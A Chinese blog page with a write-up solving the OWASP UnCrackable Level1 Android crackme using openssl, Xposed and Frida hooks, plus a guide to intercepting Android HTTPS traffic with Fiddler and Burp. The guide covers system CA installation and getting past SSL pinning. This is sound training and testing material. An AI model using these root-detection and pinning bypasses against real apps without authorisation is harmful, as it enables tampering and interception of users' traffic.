    <article id="post-从OWASP-CrackMe学Android逆向-一" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/05/从OWASP-CrackMe学Android逆向-一/" class="article-date">
  <time datetime="2019-11-06T00:40:47.000Z" itemprop="datePublished">2019-11-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/05/从OWASP-CrackMe学Android逆向-一/">从OWASP CrackMe学Android逆向(一)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="准备环境、工具"><a href="#准备环境、工具" class="headerlink" title="准备环境、工具"></a>准备环境、工具</h2><p>Pixel(Magisk+Xposed/EdXposed)<br>这里要安利一下Magisk，它现在有个超强的Magisk Hide功能，能隐藏root状态，不过我还没研究过它的原理，如果后面有机会的话会稍微整理一下的。</p>
<h2 id="UnCrackable-Level1"><a href="#UnCrackable-Level1" class="headerlink" title="UnCrackable-Level1"></a>UnCrackable-Level1</h2><p>进入到存有UnCrackable的文件目录下，<code>adb install UnCrackable-Level1.apk</code>把APK安装到手机上。打开应用之后，发现应用存在root检测，一旦发现了root状态，点击OK之后应用就会被kill。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919408/OWASP/1.png" alt><br>可以反编译apk之后patch root检测部分的内容，重打包之后安装到手机里面绕过root检测，也可以用Magisk自带的Magisk Hide绕过。Magisk Hide设置方法如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919459/OWASP/2.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919460/OWASP/3.png" alt><br>当然第二张图里会不一样，我们需要选中UnCrackable-Level1.apk。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919460/OWASP/4.png" alt></p>
<p>随便输个内容，按下VERIFY，发现出现了个弹窗，要我们再试一下。OK，可以看出我们应该从反编译apk开始入手，找找它这个验证的代码逻辑，看看能不能找到正确的字符串，或者看看有没有方法绕过这样的条件判断。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919461/OWASP/5.png" alt></p>
<p>如果代码量过大的话，我们可以通过<code>adb shell dumpsys activity top | findstr ACTIVITY</code>定位要找的界面的代码。像下面这样，就能定位到界面<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919463/OWASP/6.png" alt></p>
<p>不过用JEB看一下，发现这个代码量真的不是很大….用JEB打开MainActivity之后看到一个verify的函数没有经过混淆，看代码逻辑，判断的条件由a.a()函数传递，返回的是一个boolean类型的值。如果Level1真要让我们弹出Success的话，就没什么意思了，那就跟进a.a()函数里面看看。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919464/OWASP/7.png" alt></p>
<p>发现a.a()中调用了加密的算法，之后将用户输入的值也就是arg5与加密后的结果进行比对，若比对成功的话，就说明我们输入的是正确的。明显这个crackme的意图不是要我们patch源代码然后得到弹窗Success, 而是获得flag, 也就是密文<code>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=</code>解密后的结果。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919464/OWASP/8.png" alt></p>
<h3 id="CTF解题法"><a href="#CTF解题法" class="headerlink" title="CTF解题法"></a>CTF解题法</h3><p>可以使用动态和静态两种方法获得明文, 静态的方法参照文章<a href="https://nankeen.me/posts/owasp-android-level1/" target="_blank" rel="noopener">OWASP Android Crackme Level 1</a>, 文章的作者使用了openssl和硬编码在源码中的密钥<code>8d127684cbc37c17616d806cf50473cc</code>解密<code>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919465/OWASP/9.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919466/OWASP/10.png" alt><br>通过代码我们可以知道AES算法使用了ECB加密模式, 且在CTF中AES-128加密算法的密钥一般为32位, 输入命令<code>echo 5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= | openssl enc -aes-128-ecb -base64 -d -nopad -K 8d127684cbc37c17616d806cf50473cc</code>可获取flag<code>I want to believe</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919467/OWASP/11.png" alt></p>
<h3 id="Xposed解法"><a href="#Xposed解法" class="headerlink" title="Xposed解法"></a>Xposed解法</h3><p>感觉上面的方法太巧妙了, 下面会补充一个没那么巧妙且常用的方法——Xposed hook, 我一开始找到函数a.a(), 但是因为参数类型填写不正确的原因, 加上该函数实际上返回的是<code>byte []</code>类型的数据, 所以不能得到正确的flag, Xposed模块param.getResult()的返回值又是String类型的数据，所以在这里我们需要处理数据转换的问题。具体的Xposed模块代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.example.unlock;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line">public class HookMain implements IXposedHookLoadPackage &#123;    </span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;               </span><br><span class="line">        if(!lpparam.packageName.equals(&quot;owasp.mstg.uncrackable1&quot;)) //过滤包名</span><br><span class="line">            return; </span><br><span class="line">        XposedBridge.log(&quot;Loaded app: &quot; + lpparam.packageName);        //Hook a方法        </span><br><span class="line">        try &#123;              </span><br><span class="line">            XposedHelpers.findAndHookMethod(&quot;sg.vantagepoint.a.a&quot;, lpparam.classLoader, &quot;a&quot;, byte [].class, byte [].class, new XC_MethodHook() &#123;                </span><br><span class="line">                @Override                </span><br><span class="line">                protected void beforeHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;                                 </span><br><span class="line">                &#125;                            </span><br><span class="line">                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;                    </span><br><span class="line">                    // 转换数据类型</span><br><span class="line">                    String flag = new String((byte []) param.getResult()); </span><br><span class="line">                    // 在这里使用Log.i()可能会输出失败, 最好还是用XposedBridge.log</span><br><span class="line">                    XposedBridge.log(&quot;SECRET: &quot; + flag);               </span><br><span class="line">                &#125;            </span><br><span class="line">           &#125;);       </span><br><span class="line">        &#125; catch (Throwable e)&#123;            </span><br><span class="line">            XposedBridge.log(&quot;hook failed&quot;);            </span><br><span class="line">            XposedBridge.log(e);       </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>安装Xposed模块并重启之后，随便输入之后提交，得到flag<code>I want to believe</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919467/OWASP/12.png" alt></p>
<h3 id="Frida解题法"><a href="#Frida解题法" class="headerlink" title="Frida解题法"></a>Frida解题法</h3><p>还可以按照wp <a href="https://enovella.github.io/android/reverse/2017/05/18/android-owasp-crackmes-level-1.html" target="_blank" rel="noopener">Level1 Writeup</a>使用Frida hook代码获取flag。</p>
<p>Frida使用的过程中不能和Magisk Hide一起使用, 不然会出现<code>Failed to spawn: unable to access zygote64 while preparing for app launch; try disabling Magisk Hide in case it is active</code>的报错。所以我们需要先关掉Magisk Hide(Magisk Manager &gt; Settings &gt;Magisk &gt; Magisk Hide (关掉)), 并且还要在Frida脚本里面绕过root的检测。</p>
<p>因为之前没有接触过Frida, 也算是用这个实例来学习Frida的使用, 如果跟我一样不是很熟悉Frida, 可以配合<a href="https://www.frida.re/docs/javascript-api/#java" target="_blank" rel="noopener">Frida的官方文档</a>一起食用, 文档中有Frida的js API使用说明, 下面的代码主要涉及的是调用Java函数的部分。作者在这里写的绕过root和debug的思路我觉得值得学习和思考, 有种听君一席话, 胜读十年书的感觉。当然, 这样讲还是有点夸张的, 不过真的很值得学习。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">  send(&quot;Starting hooks OWASP uncrackable1...&quot;);</span><br><span class="line">  /*</span><br><span class="line">    hook java.lang.System.exit, 使该函数只用来输出下面的字符串</span><br><span class="line">    避免了应用的检测机制导致应用退出, 使用该方法绕过Java层的root/debug检测 </span><br><span class="line">  */</span><br><span class="line">  var sysexit = Java.use(&quot;java.lang.System&quot;);</span><br><span class="line">  sysexit.exit.overload(&quot;int&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;java.lang.System.exit(I)V  // We avoid exiting the application  :)&quot;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var aes_decrypt = Java.use(&quot;sg.vantagepoint.a.a&quot;);</span><br><span class="line">  aes_decrypt.a.overload(&quot;[B&quot;,&quot;[B&quot;).implementation = function(var_0,var_1) &#123;</span><br><span class="line">    send(&quot;sg.vantagepoint.a.a.a([B[B)[B   doFinal(enc)  // AES/ECB/PKCS7Padding&quot;);</span><br><span class="line">    send(&quot;Key       : &quot; + var_0);</span><br><span class="line">    send(&quot;Encrypted : &quot; + var_1);</span><br><span class="line">    /*</span><br><span class="line">      重载解密函数, 并获取其返回值, 因其类型为byte [], </span><br><span class="line">      js在调用Java方法之后只能返回一个对象, 而不是返回一个byte类型的数组</span><br><span class="line">    */</span><br><span class="line">    var ret = this.a.overload(&quot;[B&quot;,&quot;[B&quot;).call(this,var_0,var_1);</span><br><span class="line">    send(&quot;Decrypted : &quot; + ret);</span><br><span class="line"></span><br><span class="line">    var flag = &quot;&quot;;</span><br><span class="line">    //将char类型转换为String类型</span><br><span class="line">    for (var i=0; i &lt; ret.length; i++)&#123;</span><br><span class="line">      flag += String.fromCharCode(ret[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    send(&quot;Decrypted flag: &quot; + flag);</span><br><span class="line">    return ret; //[B</span><br><span class="line">  &#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var mainactivity = Java.use(&quot;sg.vantagepoint.uncrackable1.MainActivity&quot;);</span><br><span class="line">  mainactivity.onStart.overload().implementation = function() &#123;</span><br><span class="line">    send(&quot;MainActivity.onStart() HIT!!!&quot;);</span><br><span class="line">    var ret = this.onStart.overload().call(this);</span><br><span class="line">  &#125;;</span><br><span class="line">  //var mainactivity = Java.use(&quot;sg.vantagepoint.uncrackable1.MainActivity&quot;);</span><br><span class="line">  mainactivity.onCreate.overload(&quot;android.os.Bundle&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;MainActivity.onCreate() HIT!!!&quot;);</span><br><span class="line">    var ret = this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this,var_0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var activity = Java.use(&quot;android.app.Activity&quot;);</span><br><span class="line">  activity.onCreate.overload(&quot;android.os.Bundle&quot;).implementation = function(var_0) &#123;</span><br><span class="line">    send(&quot;Activity HIT!!!&quot;);</span><br><span class="line">    var ret = this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this,var_0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  send(&quot;Hooks installed.&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这里小小啰嗦一下Frida的使用方法, 安装的话直接<code>pip install frida-tools</code>, 还有下载适合自己设备的frida-server的版本, push进设备, 加上权限就行。下面是对frida-server进行的操作的操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">$ su</span><br><span class="line"># cd /data/local/tmp # 进入frida-server的目录下</span><br><span class="line"># ./frida-server &amp;</span><br></pre></td></tr></table></figure></p>
<p>之后重新开一个cmd窗口, 进入.js脚本, 也就是hook的脚本所在的目录下执行<code>frida -U owasp.mstg.uncrackable1 -l cracker.js</code>(我的hook文件名为cracker.js),  就能获取flag：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572919470/OWASP/13.png" alt></p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>其实在使用Frida绕过应用检测的时候我想到一个问题, 我认为重载<code>java.lang.System.exit</code>的方法只能绕过Java层调用的exit函数, 而不能绕过native层的函数。Java层，测试后已知hook<code>java.lang.System.exit</code>是不能阻止应用被系统层强制退出的。而native层的, 还没遇到一个这样的demo可以用来测试, 但是我猜测native层的还是需要hook native层的exit函数。如果跳出了这两个层级, 直接对系统层的exit进行注入, 会导致系统崩溃吗？如我的思考或文章出现了错误，希望各位大佬不吝赐教。</p>
<p>最后，附上<a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android" target="_blank" rel="noopener">CrackMe的下载链接</a>。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/11/05/从OWASP-CrackMe学Android逆向-一/" data-id="ckrzo1bj8000bdfrt1nb0tdal" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android逆向/">Android逆向</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Android抓包总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/12/Android抓包总结/" class="article-date">
  <time datetime="2019-10-12T21:16:47.000Z" itemprop="datePublished">2019-10-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/12/Android抓包总结/">Android抓包总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章算是总结一下我之前抓包遇到的一些问题, 个人属性里带bug, 所以遇到的问题会比较多, 算是给大家提供一个抓包抓不到应该如何解决的思路。</p>
<h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><p>Android中可用的抓包软件有fiddler、burpsuite、Charls、HttpCanary、Packet Capture、tcpdump、wireshark等等。tcpdump和wireshark可以解决部分不是使用HTTP/HTTPS协议传输数据的app, 用tcpdump抓包, 用wireshark分析数据包。</p>
<p>如果想抓取三大运营商传输的数据包并分析, 因其路由规则的限制, 可能还是需要在android系统中利用iptables设置反向代理, 用Fiddler解密数据包之后分析, 不过好像Fiddler好像有自己的反向代理设置方法, 这部分了解不多。</p>
<p>Charls是Mac上常见的抓包工具, 我没用过, 不过网上蛮多教程的。HttpCanary和Packet Capture这两个工具与常规的电脑上的代理抓包不同的是, 能保证一定能抓取到数据包, 我一般都用Packet Capture来验证应用是否发送请求。HttpCanary被称为移动端的Fiddler, 能够改包和劫持双向认证的应用传输的数据包, 感觉还是蛮强大的。</p>
<h2 id="Fiddler抓取Android数据包"><a href="#Fiddler抓取Android数据包" class="headerlink" title="Fiddler抓取Android数据包"></a>Fiddler抓取Android数据包</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><ol>
<li>下载好Fiddler之后, 打开该软件, 生成证书。</li>
</ol>
<p><img src="https://uploader.shimo.im/f/YoRSSTOAm40HjvOk.png!thumbnail" alt></p>
<p>设置连接</p>
<p><img src="https://uploader.shimo.im/f/8Hrm7NrNnUkCGojo.png!thumbnail" alt></p>
<p>设置HTTPS</p>
<p><img src="https://uploader.shimo.im/f/K2U52kjjZ0Aafipf.png!thumbnail" alt></p>
<p>用ipconfig查看当前主机的ip</p>
<p><img src="https://uploader.shimo.im/f/oTd5nyZ8J5AF3cax.png!thumbnail" alt></p>
<p>手机和电脑在同一局域网中即可, 手机端设置WLAN种给网络设置代理, 选择对应的WLAN, 选中修改网络, 手动设置代理, 主机名填上面电脑ip地址, 端口写fiddler默认端口8888。</p>
<p><img src="https://uploader.shimo.im/f/WaBtKFdDBtkvIwGE.png!thumbnail" alt></p>
<p>手机端用浏览器访问<a href="http://电脑IP:端口" target="_blank" rel="noopener">http://电脑IP:8</a>888, 观察网络是否访问成功, 成功之后, 点击”FiddlerRoot.certificate”下载Fiddler的证书并安装。</p>
<p><img src="https://uploader.shimo.im/f/iezwWVp7kjMiC2tJ.png!thumbnail" alt></p>
<p>如果上述步骤都原原本本做完了, 还是不能出现上图的效果, 可以换个路由或者直接手机开热点。我当时遇到不能访问的问题, ping了一下, 一直显示destination unreachable, 应该是路由器安全规则的限制, 换成了手机开热点就ok了。</p>
<p>继续进行测试的时候, 发现不管是修改密码还是用验证码进行登录, 我都抓不到那些包。想不出是哪里出了问题…..大概找了一下, 发现是SSL Pinning的机制阻止了我抓包。使用了Xposed+JustTrustMe, 就抓取到数据包了, 数据包如下：</p>
<p><img src="https://uploader.shimo.im/f/YagZMTHURpYeFDV1.png!thumbnail" alt></p>
<p>如果知道Fiddler怎么抓包了, 不知道怎么改包, 可以用Fiddler左下角的黑框框中断请求, 修改之后再发出, 比如输入<code>bpu baidu.com</code>就可以中断所有发向baidu.com的请求。</p>
<p><img src="https://uploader.shimo.im/f/hRhy1vVAJy8uhCf5.png!thumbnail" alt></p>
<p>之后查看中断的数据包会出现如下效果, 修改完点击Run to Completion就可以把请求发出去了。</p>
<p><img src="https://uploader.shimo.im/f/yYfWjk6WnhEpv2u2.png!thumbnail" alt></p>
<h3 id="Fiddler设置之后手机无法连接上代理"><a href="#Fiddler设置之后手机无法连接上代理" class="headerlink" title="Fiddler设置之后手机无法连接上代理"></a>Fiddler设置之后手机无法连接上代理</h3><ol>
<li><p>关闭电脑防火墙</p>
</li>
<li><p>打开注册表（cmd-regedit）, 在HKEY_CURRENT_USER\Software\Microsoft\Fiddler2下创建一个DWORD, 值置为80（十进制）[在空白处右键即可创建]。</p>
</li>
</ol>
<p><img src="https://uploader.shimo.im/f/Qfnh75TSPSUEqjvl.png!thumbnail" alt></p>
<ol start="3">
<li>编写fiddlerScript rule：在Fiddler上点击Rules-&gt;Customize Rules, 用Ctrl+F查找OnBeforeRequest方法添加一行代码。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (oSession.host.toLowerCase() == &quot;webserver:8888&quot;) </span><br><span class="line">&#123;</span><br><span class="line">        oSession.host = &quot;webserver:80&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Burpsuite抓取Android数据包"><a href="#Burpsuite抓取Android数据包" class="headerlink" title="Burpsuite抓取Android数据包"></a>Burpsuite抓取Android数据包</h2><h3 id="基础设置-1"><a href="#基础设置-1" class="headerlink" title="基础设置"></a>基础设置</h3><p>Burpsuite改包的步骤就不在这里赘述了, 网上有很多教程, 接下来我们要设置burpsuite, 以求抓取到数据包, 设置如下：</p>
<p><img src="https://uploader.shimo.im/f/M3xHMTeMagI3ZsVX.png!thumbnail" alt></p>
<p>提示, 监听的端口号、电脑内网ip要和手机上的代理设置一致, 电脑内网ip可以用ipconfig查看。用burpsuite一直抓取不到https的证书, 怀疑是我burpsuite证书没有安装到手机上, 所以我现在先将它装到系统证书中, 再看看能不能先抓取到https的证书。</p>
<h3 id="安装证书至系统中"><a href="#安装证书至系统中" class="headerlink" title="安装证书至系统中"></a>安装证书至系统中</h3><p>1、下载.der格式的证书, 将下载的cacert.der转换格式, 并获取证书hash值, 生成&lt;证书hash&gt;.0文件, 例如：7bf17d07.0</p>
<p>2、把&lt;证书hash&gt;.0证书push到/data/local/tmp目录下后移动至/system/etc/security/cacerts/<br>(mv操作出错之后, 先试一下“mount -o rw,remount /system”如果出现了报错“mount: ‘/system’ not in /proc/mounts”, 再尝试“mount -o rw,remount /”, 就可以操作system目录了)</p>
<p>3、重启手机</p>
<p>只有root环境才能将proxy证书安装至android系统证书中, 这种方法好像能绕过应用本地证书校验, 其实burp和Fiddler还有其他的代理证书的安装方法都差不多, 最后将&lt;hash证书&gt;.0的文件mv至/system/etc/security/cacerts/目录下即可, 不建议直接将用户证书直接mv, 可能会导致环境出错也不好排查证书错误, 甚至可能导致android网络环境出错。</p>
<p>下面是具体步骤, 先在设置本地代理, 将burpsuite证书下载下来</p>
<p><img src="https://uploader.shimo.im/f/YUZrOUhhlz0L29of.png!thumbnail" alt></p>
<p>打开浏览器输入本地地址, 下载.der格式的证书</p>
<p><img src="https://uploader.shimo.im/f/avX8JsfgDlctG0ed.png!thumbnail" alt></p>
<p>此处参照文章<a href="[https://blog.chenjia.me/articles/171029-223953.html](https://blog.chenjia.me/articles/171029-223953.html">BrupSuit证书导入Android7.0以上手机</a>, 因为我windows本地安装了ubuntu的子系统, 所以直接用ubuntu1604子系统对证书进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 转换证书的格式</span><br><span class="line">$ openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM</span><br><span class="line">// 提取证书的hash</span><br><span class="line">$ openssl x509 -inform PEM -subject_hash -in cacert.pem</span><br></pre></td></tr></table></figure>
<p><img src="https://uploader.shimo.im/f/5QTxCTgXqtk6iuP8.png!thumbnail" alt></p>
<p>上图中的<code>7bf17d07</code>就为证书的hash值, 将该目录下生成的<code>7bf17d07.0</code>文件push到手机中, 最后移动到/system/etc/security/cacerts/目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb push 7bf17d07.0 /data/local/tmp</span><br><span class="line">$ adb shell </span><br><span class="line">sailfish:/ $ su</span><br><span class="line">sailfish:/ # mount -o rw,remount / # 拥有操作/目录的权限, 本意是要操作/system目录</span><br><span class="line">sailfish:/ # mv /data/local/tmp/7bf17d07.0 /system/etc/security/cacerts/7bf17d07.0</span><br></pre></td></tr></table></figure>
<p>按照原本的文章应该给<code>7bf17d07.0</code>文件添加644权限, 但是我具体操作的时候没有添加权限也成功了, 如果按照我上面的步骤出错了, 可以尝试给文件添加权限。重启之后可以看到证书安装成功。</p>
<p> <img src="https://uploader.shimo.im/f/V8pmRZPj8NgmQ6TQ.png!thumbnail" alt></p>
<p>第一次安装证书的时候出现了不能访问使用https协议的网站, 应该是我测试的手机环境出现了问题, 我重新刷机再按照上面的步骤走一遍就成功了, 如果你们也遇到访问https网站失败的问题, 可以尝试一下使用这个方法。</p>
<h1 id="Android抓包介绍"><a href="#Android抓包介绍" class="headerlink" title="Android抓包介绍"></a>Android抓包介绍</h1><p>抓包最重要的是看能不能抓取到数据包, 想要抓到包就要看app使用什么传输协议了, 一般情况下使用HTTP都是能抓到包的, 这也就不难理解, 为什么google坚持推广HTTPS了。为什么说使用HTTPS会抓不到包？现在的HTTPS都是基于TLS协议的, 它的特点就是需要确认传输双方的身份。确认了身份之后再传输数据, 这样就能避免中间人攻击了。下面来看看HTTPS, 是怎么进行数据传输的, 发现HTTPS需要先建立连接才能传输数据。</p>
<p><img src="https://uploader.shimo.im/f/hUaCWIzHHXkbF39z.png!thumbnail" alt></p>
<p>讲到要认证对方的身份, 我就想起了之前翻译的一篇<a href="https://se8s0n.github.io/2018/09/11/HTTP%E7%B3%BB%E5%88%97(%E4%BA%94" target="_blank" rel="noopener">HTTP安全</a>), 里面就有提及到在使用HTTPS协议的过程中, 客户端和服务器通过证书来判断对方的身份。之前没有怎么理解, 现在才对证书的作用有比较深刻的理解。</p>
<p>文章中举了个例子, Chrome浏览器通过判断是否有证书来判断你访问的网站是否安全的, 并不是你访问的网站真的是安全的。提及这个是因为app使用HTTPS传输也是看证书的, 只不过有的app限制的比较严格只信任自带的证书, 有的app安全要求没那么高, 直接信任系统证书。</p>
<h2 id="抓包出错排查思路"><a href="#抓包出错排查思路" class="headerlink" title="抓包出错排查思路"></a>抓包出错排查思路</h2><p><img src="https://uploader.shimo.im/f/kk50Syi8sFoxSPXQ.jpg!thumbnail" alt></p>
<p>上面是大概的排查思路, 具体的细节可能有些差异。如果proxy带有证书校验, 且JustTrustMe绕不过去, 可能要自己重新根据该应用定制hook模块, 去绕过其本地证书校验, 但是大部分应用都能通过将证书安装为系统证书绕过, 如果无法在root环境下运行, 文章<a href="https://blog.nviso.be/2019/08/13/intercepting-traffic-from-android-flutter-applications/" target="_blank" rel="noopener">《Intercepting traffic from Android Flutter applications》</a>和JustTrustMe的源码应该能给你提供一点hook模块绕过证书校验的思路, 《Intercepting traffic from Android Flutter applications》讲的是如何绕过google开源框架Flutter中的证书校验进行抓包。</p>
<p>最后说抓不到包还有一种可能性, 就是要求一定要用SIM卡发出传输请求的数据包….不过这个应该应该只有使用了三大运营商的SDK或他们的应用才会出现这种情况, 这部分应该只能用反向代理才有可能抓取到传输的数据包了, 具体情况就要具体分析了。</p>
<p>当时尝试tcpdump+wireshark效果不怎么样, 因为所有的数据都经过了加密, 而wireshark不能解密, 所以对于加密传输的数据包这种方法可能有点鸡肋, 听说有<a href="[https://docs.mitmproxy.org/stable/](https://docs.mitmproxy.org/stable/">mitmdump</a>抓包工具专门处理linux环境下http/https的数据包, 不过我自己没用过, 之后要是接触了会进一步补充。</p>
<h2 id="SSL-pinning和双向认证的区别"><a href="#SSL-pinning和双向认证的区别" class="headerlink" title="SSL pinning和双向认证的区别"></a>SSL pinning和双向认证的区别</h2><p>SSL pinning实际上是客户端锁定服务器端的证书, 在要与服务器进行交互的时候, 服务器端会将CA证书发送给客户端, 客户端会调用函数对服务器端的证书进行校验, 与本地的服务器端证书(存放在<code>\&lt;app&gt;\asset</code>目录或<code>\res\raw</code>下)进行比对。</p>
<p>而双向认证是添加了客户端向服务器发送CA证书, 服务器端对客户端的证书进行校验的部分, 具体详情可看文章<a href="[https://juejin.im/post/5c9cbf1df265da60f6731f0a](https://juejin.im/post/5c9cbf1df265da60f6731f0a">扯一扯HTTPS单向认证、双向认证、抓包原理、反抓包策略</a>的单向认证、双向认证部分的内容。</p>
<h2 id="抓取HTTPS的数据包"><a href="#抓取HTTPS的数据包" class="headerlink" title="抓取HTTPS的数据包"></a>抓取HTTPS的数据包</h2><h3 id="Frida绕过SSL单向校验"><a href="#Frida绕过SSL单向校验" class="headerlink" title="Frida绕过SSL单向校验"></a>Frida绕过SSL单向校验</h3><p>昨天刚好遇到JustTrustMe无法绕过SSL单向校验的情况, 这几天接触了Frida, 就尝试用DBI的方法绕过SSL的单向校验, 参考文章<a href="https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">Universal Android SSL Pinning bypass with Frida</a>这里就不详细地说明Frida的安装方法及使用方法了。</p>
<p>设置Fiddler代理, 在本地下载Fiddler的证书, 将证书直接重命名为<code>cert-der.crt</code>。之后将证书push到<code>/data/local/tmp</code>目录下, 在adb shell里输入<code>./frida-server &amp;</code>再在PC端进行操作。</p>
